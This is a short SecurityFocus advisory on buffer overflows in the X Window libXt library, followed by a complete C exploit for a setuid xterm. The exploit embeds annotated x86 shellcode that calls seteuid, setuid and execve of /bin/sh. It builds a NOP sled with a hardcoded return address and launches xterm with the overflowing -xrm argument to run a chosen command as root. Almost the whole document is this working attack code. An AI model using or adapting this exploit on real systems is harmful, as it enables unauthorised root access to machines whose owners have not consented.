source: http://www.securityfocus.com/bid/237/info
  
The libXt library is part of the X Windows system. There are several buffer overflow conditions that may allow an unauthorized user to gain root privileges through setuid and setgid programs that are linked to libXt. These problems were openly discussed on the Bugtraq mailing list in 1996, this discussion led the OpenGroup (maintainers of the X-Windowing System) to release a new version of X Windows which was more thoroughly audited and which hopefully addressed a series of buffer overflows. 

/*
 * xterm buffer overflow by jGgM
 * http://www.netemperor.com/en/
 * EMail: jggm@mail.com
 * 
*/
#include <stdio.h>
#include <stdlib.h>

char shell[] =
  /*   0 */ "\xeb\x5f"                         /* jmp springboard       */
  /* syscall:                                                           */
  /*   2 */ "\x9a\xff\xff\xff\xff\x07\xff"     /* lcall 0x7,0x0         */
  /*   9 */ "\xc3"                             /* ret                   */
  /* start:                                                             */
  /*  10 */ "\x5e"                             /* popl %esi             */
  /*  11 */ "\x31\xc0"                         /* xor %eax,%eax         */
  /*  13 */ "\x89\x46\x9d"                     /* movl %eax,-0x63(%esi) */
  /*  16 */ "\x88\x46\xa2"                     /* movb %al,-0x5e(%esi)  */
  /* seteuid:                                                           */
  /*  19 */ "\x31\xc0"                         /* xor %eax,%eax         */
  /*  21 */ "\x50"                             /* pushl %eax            */
  /*  22 */ "\xb0\x8d"                         /* movb $0x8d,%al        */
  /*  24 */ "\xe8\xe5\xff\xff\xff"             /* call syscall          */
  /*  29 */ "\x83\xc4\x04"                     /* addl $0x4,%esp        */
  /* setuid:                                                            */
  /*  32 */ "\x31\xc0"                         /* xor %eax,%eax         */
  /*  34 */ "\x50"                             /* pushl %eax            */
  /*  35 */ "\xb0\x17"                         /* movb $0x17,%al        */
  /*  37 */ "\xe8\xd8\xff\xff\xff"             /* call syscall          */
  /*  42 */ "\x83\xc4\x04"                     /* addl $0x4,%esp        */
  /* execve:                                                            */
  /*  45 */ "\x31\xc0"                         /* xor %eax,%eax         */
  /*  47 */ "\x50"                             /* pushl %eax            */
  /*  48 */ "\x56"                             /* pushl %esi            */
  /*  49 */ "\x8b\x1e"                         /* movl (%esi),%ebx      */
  /*  51 */ "\xf7\xdb"                         /* negl %ebx             */
  /*  53 */ "\x89\xf7"                         /* movl %esi,%edi        */
  /*  55 */ "\x83\xc7\x10"                     /* addl $0x10,%edi       */
  /*  58 */ "\x57"                             /* pushl %edi            */
  /*  59 */ "\x89\x3e"                         /* movl %edi,(%esi)      */
  /*  61 */ "\x83\xc7\x08"                     /* addl $0x8,%edi        */
  /*  64 */ "\x88\x47\xff"                     /* movb %al,-0x1(%edi)   */
  /*  67 */ "\x89\x7e\x04"                     /* movl %edi,0x4(%esi)   */
  /*  70 */ "\x83\xc7\x03"                     /* addl $0x3,%edi        */
  /*  73 */ "\x88\x47\xff"                     /* movb %al,-0x1(%edi)   */
  /*  76 */ "\x89\x7e\x08"                     /* movl %edi,0x8(%esi)   */
  /*  79 */ "\x01\xdf"                         /* addl %ebx,%edi        */
  /*  81 */ "\x88\x47\xff"                     /* movb %al,-0x1(%edi)   */
  /*  84 */ "\x89\x46\x0c"                     /* movl %eax,0xc(%esi)   */
  /*  87 */ "\xb0\x3b"                         /* movb $0x3b,%al        */
  /*  89 */ "\xe8\xa4\xff\xff\xff"             /* call syscall          */
  /*  94 */ "\x83\xc4\x0c"                     /* addl $0xc,%esp        */
  /* springboard:                                                       */
  /*  97 */ "\xe8\xa4\xff\xff\xff"             /* call start            */
  /* data:                                                              */
  /* 102 */ "\xff\xff\xff\xff"                 /* DATA                  */
  /* 106 */ "\xff\xff\xff\xff"                 /* DATA                  */
  /* 110 */ "\xff\xff\xff\xff"                 /* DATA                  */
  /* 114 */ "\xff\xff\xff\xff"                 /* DATA                  */
  /* 118 */ "\x2f\x62\x69\x6e\x2f\x73\x68\xff" /* DATA                  */
  /* 126 */ "\x2d\x63\xff";                    /* DATA                  */

#define NOP	0x90
#define LEN		102

#define BUFFER_SIZE	1052
#define RET_LENGTH	12

int
main(int argc, char *argv[])
{
   char start_addr[4];
   char buffer[BUFFER_SIZE+(RET_LENGTH*4)+1];
   char *command;
   long offset, ret, start_address;
   int  len, x, y, shell_start;

   if(argc > 3 || argc < 2) {
      fprintf(stderr, "Usage: %s [command] [offset]\n", argv[0]);
      exit(1);
   } // end of if..

   command = argv[1];
   if(argc == 3) offset = atol(argv[2]);
   else offset = 0;

   len = strlen(command);
   len++;
   len = -len;
   shell[LEN+0] = (len >> 0) & 0xff;
   shell[LEN+1] = (len >> 8) & 0xff;
   shell[LEN+2] = (len >> 16) & 0xff;
   shell[LEN+3] = (len >> 24) & 0xff;

   start_address = (long)&start_addr;
   //ret = start_address - offset;
   //ret = start_address - 1080 - offset;
   ret = 0x8047910 - offset;

   for(x=0; x<BUFFER_SIZE; x++) buffer[x] = NOP;

   x = BUFFER_SIZE - strlen(command) - strlen(shell);

   for(y=0; y<strlen(shell); y++)
      buffer[x++] = shell[y];

   for(y=0; y<strlen(command); y++)
      buffer[x++] = command[y];

   for(y=0; y<RET_LENGTH; y++, x += 4)
      *((int *)&buffer[x]) = ret;

   buffer[x] = 0x00;

   printf("start_address = 0x%x\n", start_address);
   printf("ret = 0x%x,\n", ret);
   printf("offset = %d\n", offset);
   printf("command = %s\n", command);
   printf("buffer size = %d\n", strlen(buffer));
   execl("/usr/X/bin/xterm", "xterm", "-xrm", buffer, NULL);
   printf("exec failed\n");
}